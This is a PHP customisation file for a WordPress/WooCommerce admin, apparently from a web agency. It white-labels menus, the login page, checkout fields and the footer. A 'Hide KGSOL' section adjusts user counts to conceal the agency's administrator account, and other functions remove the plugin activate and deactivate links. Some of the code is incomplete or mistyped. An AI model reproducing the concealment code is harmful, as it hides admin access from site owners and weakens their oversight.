<?php
//Remove Marketing
add_filter( 'woocommerce_admin_features', function( $features ) {
    return array_values(
        array_filter( $features, function($feature) {
            return $feature !== 'marketing';
        } ) 
    );
} );

//Replace Content
add_filter( 'gettext', function( $translation, $text, $domain ) {
	if ( $domain == 'woocommerce' ) {
		if ( $text == 'VAT' ) { $translation = 'GST'; }
        if ( $text == 'Shipping' ) { $translation = 'Delivery'; }
        if ( $text == 'WooCommerce' ) { $translation = 'Store'; }
	}
	return $translation;
}, 10, 3 );
add_filter( 'woocommerce_shipping_package_name' , 'woocommerce_replace_text_shipping_to_delivery', 10, 3);
function woocommerce_replace_text_shipping_to_delivery($package_name, $i, $package){
    return sprintf( _nx( 'Delivery', 'Delivery %d', ( $i + 1 ), 'shipping packages', 'woocommerce' ), ( $i + 1 ) );
}

//Remove Bulk Settings
add_filter( 'bulk_actions-' . 'plugins', '__return_empty_array' );

//Remove Title
function custom_login_title($origtitle) {
    return get_bloginfo('name');
}
//Get User Data
if( ! function_exists( 'current_user_has_role' ) ){
    function current_user_has_role( $role ) {
        $user = get_userdata( get_current_user_id() );
        if( ! $user || ! $user->roles ){
            return false;
        }
        if( is_array( $role ) ){
            return array_intersect( $role, (array) $user->roles ) ? true : false;
        }
        return in_array( $role, (array) $user->roles );
    }
    }
    if( ! function_exists( 'current_user_has_role' ) ){
    function current_user_has_role( $role ){
        return user_has_role_by_user_id( get_current_user_id(), $role );
    }
    }
    if( ! function_exists( 'get_user_roles_by_user_id' ) ){
    function get_user_roles_by_user_id( $user_id ) {
        $user = get_userdata( $user_id );
        return empty( $user ) ? array() : $user->roles;
    }
    }
    if( ! function_exists( 'user_has_role_by_user_id' ) ){
    function user_has_role_by_user_id( $user_id, $role ) {
        $user_roles = get_user_roles_by_user_id( $user_id );
        if( is_array( $role ) ){
            return array_intersect( $role, $user_roles ) ? true : false;
        }
        return in_array( $role, $user_roles );
    }
}

//Hide KGSOL
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ($username != 'Kragsol') {
	    global $wpdb;
   	    
	}
}
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

// Disable WP Hearbeat
function stop_heartbeat() {
    wp_deregister_script('heartbeat');
}

// Disable Plugin Disability
function disable_plugin_deactivation( $actions, $plugin_file, $plugin_data, $context ) {
 
    if ( array_key_exists( 'deactivate', $actions ))
        unset( $actions['deactivate'] );
    return $actions;
}
function disable_plugin_activation( $actions, $plugin_file, $plugin_data, $context ) {
 
    if ( array_key_exists( 'activate', $actions ))
        unset( $actions['activate'] );
    return $actions;
}
// Hide Admin Bar Nodes
function remove_from_admin_bar($wp_admin_bar) {
	$wp_admin_bar->remove_node('si_menu');
	$wp_admin_bar->remove_node('updates');
	$wp_admin_bar->remove_node('comments');
    $wp_admin_bar->remove_node('new-content');
    $wp_admin_bar->remove_node('xtemos_options');
  //$wp_admin_bar->remove_node('wp-logo');
  //$wp_admin_bar->remove_node('site-name');
  //$wp_admin_bar->remove_node('my-account');
  //$wp_admin_bar->remove_node('search');
  //$wp_admin_bar->remove_node('customize');
    $wp_admin_bar->remove_node('wp-logo');
    $wp_admin_bar->remove_node('litespeed-cache');
    $wp_admin_bar->remove_node('wc-reports');
    $wp_admin_bar->remove_node('smart-slider3');
    $wp_admin_bar->remove_node('wp-optimize');
    $wp_admin_bar->remove_node('wp-admin-bar-litespeed-menu');
}

// Default Color Scheme
function set_default_admin_color($user_id) {
    $args = array(
        'ID' => $user_id,
        'admin_color' => 'modern'
    );
    wp_update_user( $args );
}

// Custom Footer
function customFoot(){
    global $bgcolor, $color,$footerCopyrights;
    ?>
    <style>
        .dots-header{
            display:none!important;
        }
        .dotstore_plugin_sidebar{
            display: none!important;
        }
        @media(max-width:600px){.pc{font-size: 12px!important}}
    </style>
    <div class="" style="background-color:<?php echo $bgcolor;?>;font-size: 12px;padding-bottom:30px;padding-top:10px;color:<?php echo $color;?>;text-align:center; display:<?php echo$footerCopyrights;?>">
   All Rights Reserved |&copy; <?php echo date('Y').'&nbsp;'; bloginfo( 'name' ); ?>| Designed By&nbsp;<a href="https://kragsol.com" style="color:<?php echo $color;?>">Kragsol</a>
    </div>
    <?php
};

// Login Style
function my_login_logo() { ?>
    <style type="text/css">
        body {
            background: url(https://papers.co/wallpaper/papers.co-vy12-simple-white-pattern-background-8-wallpaper.jpg?download=true)!important;
            background-repeat: repeat!important;
            background-size: contain!important;
        }
        .login #nav {
            display:none!important;
        }
        .login #backtoblog, .login #nav {
            display: none!important;
        }
        .login form {
            padding: 36px 34px 44px!important;
            border: 1px solid #fdfbfb!important;
            box-shadow: 0 1px 9px rgb(0 0 0 / 4%)!important;
        }
        .wp-core-ui .button, .wp-core-ui .button-secondary {
            color: red!important;
        }
        .wp-core-ui .button-primary {
            background: #1261e4!important;
            border-color: #1261e4!important;
            color: #fff!important;
            text-transform: uppercase;
            font-size: 0.7rem!important;
        }
        .wp-core-ui .button-primary:hover {    
            background: #fff!important;
            border-color: #1261e4!important;
            color: #1261e4!important;
            text-transform: uppercase;
            font-size: 0.7rem;
        }
        #login h1 a, .login h1 a {
            background-image: url('https://kragsol.com/wp-content/uploads/2021/03/kragsol-logo.png');
            padding-bottom: 0px;
            width:150px;
            background-size: contain;
        }
    </style>
    <?php
}

// Disable Dashboard Widgets
function disable_default_dashboard_widgets() {
    global $wp_meta_boxes;
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['bbp-dashboard-right-now']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['yoast_db_widget']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['rg_forms_dashboard']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['e-dashboard-overview']);
}

// Add Custom Welcome Dashboard Widget
function add_custom_dashboard_widgets() {
    wp_add_dashboard_widget(								 
        'custom_dashboard_widget', // Widget slug.
        'My Dashboard', // Title.
        'dashboard_widget_content' // Display function.
	);
}
function dashboard_widget_content() {
    echo bloginfo( 'name' )." :Hello there, Welcome! From Here You can Add products & Manage your site";
}

// Disable User Roles
function removeUserRoles() {
    global $wp_roles;
    $roles_to_remove = array('subscriber', 'contributor', 'author','officeadmin','distributor','editor');
    foreach ($roles_to_remove as $role) {
        if (isset($wp_roles->roles[$role])) {
            $wp_roles->remove_role($role);
        }
    }
}

//Remove Image Size
function remove_extra_image_sizes() {
    foreach ( get_intermediate_image_sizes() as $size ) {
        if ( !in_array( $size, array( 'thumbnail', 'medium', 'medium_large', 'large', '1536x1536', '2048x2048', 'post-thumbnail','konte-post-thumbnail-medium','konte-post-thumbnail-large','konte-post-thumbnail-navigation','konte-post-thumbnail-shortcode' ) ) ) {
            remove_image_size( $size );
        }
    }
}

//Checkout Fields
function wc_remove_checkout_fields( $fields ) {

    // Billing fields
    unset( $fields['billing']['billing_company'] );
    //unset( $fields['billing']['billing_email'] );
    //unset( $fields['billing']['billing_phone'] );
    unset( $fields['billing']['billing_state'] );
    //unset( $fields['billing']['billing_first_name'] );
    unset( $fields['billing']['billing_last_name'] );
    //unset( $fields['billing']['billing_address_1'] );
    unset( $fields['billing']['billing_address_2'] );
    unset( $fields['billing']['billing_city'] );
    //unset( $fields['billing']['billing_postcode'] );
    unset( $fields['billing']['billing_country'] );

    // Shipping fields
    unset( $fields['shipping']['shipping_company'] );
    //unset( $fields['shipping']['shipping_phone'] );
    unset( $fields['shipping']['shipping_state'] );
    //unset( $fields['shipping']['shipping_first_name'] );
    unset( $fields['shipping']['shipping_last_name'] );
    //unset( $fields['shipping']['shipping_address_1'] );
    unset( $fields['shipping']['shipping_address_2'] );
    unset( $fields['shipping']['shipping_city'] );
    //unset( $fields['shipping']['shipping_postcode'] );
    unset( $fields['shipping']['shipping_country'] );

    // Order fields
    unset( $fields['order']['order_comments'] );

    return $fields;
}
//Login Redirect
function loginRed(){
    $get_view = basename($_SERVER['REQUEST_URI']);
    // Replace link with your login page link
    $custom_login  = '/wp-admin/admin.php?page=dashboard'; 
    if( $get_view == "wp-admin" && $_SERVER['REQUEST_METHOD'] == 'GET')
    {
       wp_redirect($custom_login);
    }
}

// Admin Style for Pretty Look
function my_admin_theme_style() {
    wp_enqueue_style('my-page-theme', plugins_url('dash.css', __FILE__));
    wp_enqueue_style('my-admin-theme', plugins_url('backend.css', __FILE__));
}

// Admin Backend Menu
function adminMenu() {                   
    remove_menu_page( 'edit.php?post_type=static_block' );  
    remove_menu_page( 'nav-menus.php' );  
    remove_menu_page( 'widgets.php' );  
    remove_menu_page( 'edit.php?post_type=la_team_member' );  
    remove_menu_page( 'upload.php' );  
    remove_menu_page( 'edit_others_posts' );  
    remove_menu_page( 'edit.php' );  
    remove_menu_page( 'edit.php?post_type=page' );  
    remove_menu_page( 'edit.php?post_type=basel_slide' );  
    remove_menu_page( 'edit.php?post_type=basel_sidebar' ); 
    remove_menu_page( 'edit.php?post_type=cms_block' );     
    remove_menu_page( 'edit.php?post_type=basel_size_guide' );  
    remove_menu_page( 'edit.php?post_type=portfolio' );   
    remove_menu_page( 'admin.php' );
    remove_menu_page( 'admin.php?page=afrsm-pro-list' ); 
    remove_menu_page( 'admin.php?page=lddfw-dashboard' );  
    remove_menu_page( 'lddfw-dashboard' );  
    remove_menu_page( 'edit-comments.php' );         
    remove_menu_page( 'users-user-role-editor.php' );         
    remove_menu_page( 'users.php?page=users-user-role-editor.php' );  
    remove_menu_page( 'themes.php' );                 
    remove_menu_page( 'plugins.php' );                 
    remove_menu_page( 'tools.php' );                
    remove_menu_page( 'options-general.php' ); 
    remove_menu_page( 'pwa-for-wp' ); 
    remove_menu_page( 'rnlab-app-control' ); 
    remove_menu_page( 'wcfm-license' ); 
    remove_menu_page( 'afrsm-pro-list' ); 
    remove_menu_page( 'edit.php' ); 
    remove_menu_page( 'edit.php?post_type=flex_post' ); 
    remove_menu_page( 'admin.php?page=image-sizes' ); 
    remove_menu_page( 'image-sizes' ); 
    remove_menu_page( 'vc-general' );  
    remove_menu_page( 'woocommerce' ); 
    remove_menu_page( 'wpforms-overview' );     
    remove_menu_page( 'yith' );   
    remove_menu_page( 'envato' ); 
    remove_menu_page( 'envato-market' );  
    remove_menu_page( 'cms_block' );  
    remove_menu_page( 'theme_options' );  
    remove_menu_page( 'wcfm_settings' ); 
    remove_menu_page( 'theme_options' ); 
    remove_menu_page( 'wpfastestcacheoptions' );  
    remove_menu_page( 'yith_plugin_panel' );  
    remove_menu_page( 'revslider' ); 
    remove_menu_page( 'woo-variation-swatches-settings' ); 	
    remove_menu_page( 'woo-orders-tracking' ); 
    remove_menu_page( 'index.php' ); 
    remove_menu_page( 'xtemos_options' ); 
    remove_menu_page( 'wpseo_dashboard' ); 
    remove_menu_page( 'mailchimp-for-wp' ); 
    remove_menu_page( 'pgs-woo-api-settings' ); 
    remove_menu_page( 'basel_dashboard' );
    remove_menu_page( 'wpcf7' );
    remove_menu_page( 'wpam-affiliates' );
    remove_menu_page( 'wc-admin&path=/marketing' ); 
    remove_menu_page( 'WP-Optimize' ); 
    remove_menu_page( 'duplicator' );
    remove_menu_page( 'dots_store' ); 
    remove_menu_page( 'gmw-extensions' ); 
    remove_menu_page( 'litespeed' ); 
    remove_menu_page( get_option( 'siteurl' ).'/store-manager/settings/#wcfm_settings_form_marketplace_head' ); 
    remove_menu_page( 'woo-wallet' ); 
    remove_menu_page( 'coderockz-woo-delivery-settings' ); 
    remove_menu_page( 'click-to-chat' ); 
    remove_menu_page( 'smart-slider3' ); 
    remove_menu_page( 'kapee-theme' ); 
    remove_menu_page( 'auxin-welcome' ); 
    remove_menu_page( 'elementor' ); 
    remove_menu_page( 'edit.php?post_type=elementor_library' ); 
    remove_menu_page( 'wp-ulike-settings' ); 
    remove_menu_page( 'wc-admin&path=/analytics/overview' ); 
}
add_action( 'admin_menu', 'my_admin_menu' );  
    
// Admin Extra Menu Items Pages
function adminPages() {

	add_menu_page('Help & Support', 'Dashboard', 'manage_options', 'dashboard', 'help_output','dashicons-editor-help', 1  );
    add_menu_page( 'Slider', 'Slider', 'manage_options', 'smart-slider3', '', 'dashicons-images-alt2', 3 );
	
	add_menu_page( 'Order Export', 'Order Export', 'manage_options', 'admin.php?page=wc-order-export', '', 'dashicons-share', 17 );
    add_menu_page( 'Orders', 'Orders', 'manage_options', 'edit.php?post_type=shop_order', '', 'dashicons-megaphone', 10 );
	add_menu_page( 'Vendors', 'Vendors', 'manage_options', '/store-manager', '', 'dashicons-store', 30 );

    add_menu_page('Delivery Zones', 'Delivery', 'manage_options', 'wc-settings&tab=shipping', 'help_output','dashicons-car', 30  );
    add_submenu_page('wc-settings&tab=shipping', 'Delivery Zones', 'Delivery Zones', 'manage_options', 'wc-settings&tab=shipping' );
    add_submenu_page('wc-settings&tab=shipping', 'Courier Partners', 'Courier Partners', 'manage_options', 'admin.php?page=woocommerce-advanced-shipment-tracking&tab=shipping-providers' );
    add_submenu_page('wc-settings&tab=shipping', 'Delivery Boys', 'Delivery Boys', 'manage_options', 'admin.php?page=lddfw-dashboard' );
    add_submenu_page('wc-settings&tab=shipping', 'Delivery Slots', 'Delivery Slots', 'manage_options', 'admin.php?page=oderockz-woo-delivery-settings' );
    add_submenu_page('wc-settings&tab=shipping', 'Delivery Settings', 'Delivery Settings', 'manage_options', 'admin.php?page=afrsm-pro-list' );

    add_menu_page( 'Discount Rules', 'Discount Rules', 'manage_options', 'admin.php?page=wcdrfc-rules-list', '', 'dashicons-tag', 70 );
    add_menu_page( 'Tax Settings', 'Tax Settings', 'manage_options', 'admin.php?page=wc-settings&tab=tax&section=standard', '', 'dashicons-list-view', 71 );
    add_menu_page( 'Invoice Settings', 'Invoice Settings', 'manage_options', 'admin.php?page=wpo_wcpdf_options_page', '', 'dashicons-welcome-write-blog', 71 );
    add_menu_page( 'Email Settings', 'Email Settings', 'manage_options', 'admin.php?page=wc-settings&tab=email', '', 'dashicons-email-alt2', 71 ); 
    add_menu_page( 'Payment Settings', 'Payment Settings', 'manage_options', 'admin.php?page=wc-settings&tab=checkout', '', 'dashicons-money-alt', 71 ); 
	add_menu_page( 'Wallet', 'Wallet', 'manage_options', 'admin.php?page=woo-wallet', '', 'dashicons-category', 100 ); 
	add_submenu_page( 'admin.php?page=woo-wallet', 'Wallet Settings', 'Wallet Settings', 'manage_options', 'admin.php?page=woo-wallet-settings');
	add_submenu_page( 'admin.php?page=woo-wallet', 'Wallet Actions', 'Wallet Actions', 'manage_options', 'admin.php?page=woo-wallet-actions');
    add_menu_page( 'WhatsApp', 'WhatsApp', 'manage_options', 'admin.php?page=click-to-chat', '', 'dashicons-whatsapp', 190 );
}

// Sales Backend Menu
function salesMenu() {                   
    remove_menu_page( 'edit.php?post_type=static_block' );  
    remove_menu_page( 'quick-featured-images-overview' );  
    remove_menu_page( 'upload.php' );  
    remove_menu_page( 'import.php' );  
    remove_menu_page( 'edit.php?post_type=page' );  
    remove_menu_page( 'edit.php?post_type=product' );  
    remove_menu_page( 'woo-wallet' );  
    remove_menu_page( 'click-to-chat' );  
    remove_menu_page( 'smart-slider3' );  
    remove_menu_page( 'users.php' );  
    remove_menu_page( 'wf_woocommerce_packing_list' );  
    remove_menu_page( 'wc-admin&path=/analytics/overview' );  
    remove_menu_page( 'profile.php' );  
    remove_menu_page( 'woocommerce-marketing' );  
    remove_menu_page( 'litespeed' );  
    remove_menu_page( 'revslider' );  
    remove_menu_page( 'edit.php?post_type=basel_slide' );  
    remove_menu_page( 'edit.php?post_type=basel_sidebar' ); 
    remove_menu_page( 'edit.php?post_type=cms_block' );     
    remove_menu_page( 'edit.php?post_type=basel_size_guide' );  
    remove_menu_page( 'edit.php?post_type=portfolio' );  
    remove_menu_page( 'admin.php?page=afrsm-pro-list' );  
    remove_menu_page( 'lddfw-dashboard' );  
    remove_menu_page( 'edit-comments.php' );         
    remove_menu_page( 'users-user-role-editor.php' );         
    remove_menu_page( 'users.php?page=users-user-role-editor.php' );        
    remove_menu_page( 'themes.php' );                 
    remove_menu_page( 'plugins.php' );                 
    remove_menu_page( 'tools.php' );                
    remove_menu_page( 'options-general.php' );  
    remove_menu_page( 'admin.php' );
    remove_menu_page( 'pwa-for-wp' ); 
    remove_menu_page( 'rnlab-app-control' ); 
    remove_menu_page( 'wcfm-license' ); 
    remove_menu_page( 'afrsm-pro-list' ); 
    remove_menu_page( 'edit.php' ); 
    remove_menu_page( 'edit.php?post_type=flex_post' ); 
    remove_menu_page( 'admin.php?page=image-sizes' ); 
    remove_menu_page( 'vc-general' );  
    remove_menu_page( 'woocommerce' ); 
    remove_menu_page( 'wpforms-overview' );     
    remove_menu_page( 'dmin.php?page=lddfw-dashboard' ); 
    remove_menu_page( 'yith' );   
    remove_menu_page( 'envato' ); 
    remove_menu_page( 'envato-market' );  
    remove_menu_page( 'cms_block' );  
    remove_menu_page( 'theme_options' );  
    remove_menu_page( 'wcfm_settings' ); 
    remove_menu_page( 'theme_options' ); 
    remove_menu_page( 'wpfastestcacheoptions' );  
    remove_menu_page( 'yith_plugin_panel' );  
    remove_menu_page( 'woo-variation-swatches-settings' ); 	
    remove_menu_page( 'woo-orders-tracking' ); 
    remove_menu_page( 'index.php' ); 
    remove_menu_page( 'xtemos_options' ); 
    remove_menu_page( 'wpseo_dashboard' ); 
    remove_menu_page( 'mailchimp-for-wp' ); 
    remove_menu_page( 'pgs-woo-api-settings' ); 
    remove_menu_page( 'basel_dashboard' );
    remove_menu_page( 'wpcf7' );
    remove_menu_page( 'wpam-affiliates' );
    remove_menu_page( 'wc-admin&path=/marketing' ); 
    remove_menu_page( 'WP-Optimize' ); 
    remove_menu_page( 'duplicator' );
    remove_menu_page( 'dots_store' ); 
    remove_menu_page( 'gmw-extensions' ); 
    remove_menu_page( 'litespeed' ); 
    remove_menu_page( '/store-manager/settings/#wcfm_settings_form_marketplace_head' ); 
    remove_menu_page( 'woo-wallet' ); 
    remove_menu_page( 'coderockz-woo-delivery-settings' ); 
    remove_menu_page( 'click-to-chat' ); 
    remove_menu_page( 'smart-slider3' ); 
	
}

// Sales Pages
function salesPages() {
    add_menu_page( 'Add Orders', 'Add Orders', 'manage_options', 'post-new.php?post_type=shop_order', '', 'dashicons-megaphone', 25 );
}